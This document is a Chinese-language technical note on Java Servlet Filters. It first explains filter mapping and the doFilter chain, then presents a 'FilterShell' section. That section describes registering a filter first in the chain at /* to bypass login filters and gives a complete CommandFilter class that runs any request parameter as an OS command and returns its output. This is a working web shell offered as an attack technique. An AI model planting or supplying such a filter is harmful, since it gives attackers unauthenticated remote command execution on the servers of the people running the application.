# Java Servlet Filter

> [Servlet 3.1 规范 — Filter 主要概念](https://github.com/waylau/servlet-3.1-specification/blob/master/docs/Filtering/6.2%20Main%20Concepts.md)

Filter 是 Servlet 规范中定义的一个 Web 组件，可作用在一个 Servlet 或多个 Servlet 上，以链式的方式顺序调用，其允许改变请求和响应的头信息和内容。常见的过滤器有登录认证过滤器、字符编码过滤器以及加解密过滤器。

## Filter 配置

Filter 可以选择应用的 url-pattern 或 servlet-name，以下两种方式等价

```xml
<filter-mapping>
    <filter-name>Multipe Mappings Filter</filter-name>
    <url-pattern>/foo/*</url-pattern>
    <servlet-name>Servlet1</servlet-name>
    <servlet-name>Servlet2</servlet-name>
    <url-pattern>/bar/*</url-pattern>
</filter-mapping>
```

```java
@WebFilter(
        filterName = "Multipe Mappings Filter",
        urlPatterns = {"/foo/*", "/bar/*"},
        servletNames = {"Servlet1", "Servlet2"}
)
public class MultipeMappingsFilter implements Filter {
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        // TODO
    }
}
```

## doFilter

Web 容器在启动时，会扫描 Web 应用中所有 Filter 的定义来注册 Filter，并将其封装成 FilterChain，每个 Filter 在 JVM 中只会有一个实例。

Filter 的接口签名如下，其中最重要的就是 doFilter 方法。

1. Web 容器在接收到请求时，会获取 FilterChain 中的第一个过滤器将 request、response 以及 chain 传入 doFilter 方法中进行调用。
2. 当过滤器链中最后一个过滤器被调用，将会访问到最终的 Servlet 或静态资源。
3. 手动在 doFilter 中调用 `chain.doFilter(request, response)`，将会访问 chain 中下一个过滤器。
4. 在 doFilter 中可以选择不调用 `chain.doFilter(request, response)` 则意为阻止当前请求，那么当前过滤器需要负责填充响应对象。

```java
public interface Filter {
    /**
     * 由 Web 容器在初始化 Filter 时调用。
     */
    public void init(FilterConfig filterConfig) throws ServletException;
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)throws IOException, ServletException;
    /**
     * 由 Web 容器在卸载 Filter 时调用。
     */
    public void destroy();
}
```

## FilterShell

shell 的目的，就是为了定义一个入口，我们能与 Web 服务器进行交互。在 Filter 中我们就是实现 doFilter 来满足需求，以下定义了一个命令回显的 FilterShell。

1. 一般而言，我们会为 FilterShell 注册 url-pattern 为 `/*`，这样无论访问哪个路径都能被调用到，而且为了绕过登录过滤器，我们会把 FilterShell 注册为  FilterChain 中的第一个过滤器。
2. 交互的入口是 `request.getParameter` 支持两种方式传参。GET/POST 请求发送 `/?paramName=whoami`，也可以发送 POST 请求时使用 `application/x-www-form-urlencoded` 发送 body 参数。`multipart/form-data` 是不支持从 `request.getParameter` 获取参数的。
3. 当 Filter 注册的 url-pattern 为 `/*` 时，我们拿到 cmd 参数，就可以执行命令并填充响应对象 `return` 结束请求，而在拿不到参数的时候就必须调用 `chain.doFilter(servletRequest, servletResponse)`，否则正常的业务就不会被执行。

```java
public class CommandFilter implements Filter {
    public static String paramName;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest servletRequest = (HttpServletRequest) request;
        HttpServletResponse servletResponse = (HttpServletResponse) response;
        String cmd = servletRequest.getParameter(paramName);
        if (cmd != null) {
            Process exec = Runtime.getRuntime().exec(cmd);
            InputStream inputStream = exec.getInputStream();
            ServletOutputStream outputStream = servletResponse.getOutputStream();
            byte[] buf = new byte[8192];
            int length;
            while ((length = inputStream.read(buf)) != -1) {
                outputStream.write(buf, 0, length);
            }
            return;
        }
        chain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
```
